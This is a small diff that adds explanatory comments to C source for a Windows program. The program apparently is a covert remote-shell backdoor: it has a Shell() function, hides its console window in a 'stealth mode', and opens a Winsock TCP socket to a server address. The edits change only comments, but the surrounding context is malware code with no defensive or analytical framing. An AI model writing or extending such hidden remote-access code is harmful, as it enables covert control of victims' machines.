@@ -77,7 +77,7 @@ void Shell(){
 }
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmfLine, int nCmdShow){
-    //Hide the console
+    //Hide the console by creating stealth mode
     HWND stealth;
     AllocConsole();
     stealth = FindWindowA("ConsoleWindowClass", NULL);
@@ -96,6 +96,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmfLine, int 
 	if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0 ){
 		exit(1);
 	}
+	// Provide connection-oriented byte stream by using AF_INET address family
 	sock=socket(AF_INET, SOCK_STREAM,0);
 
 	memset(&ServAddr, 0 ,sizeof(ServAddr));
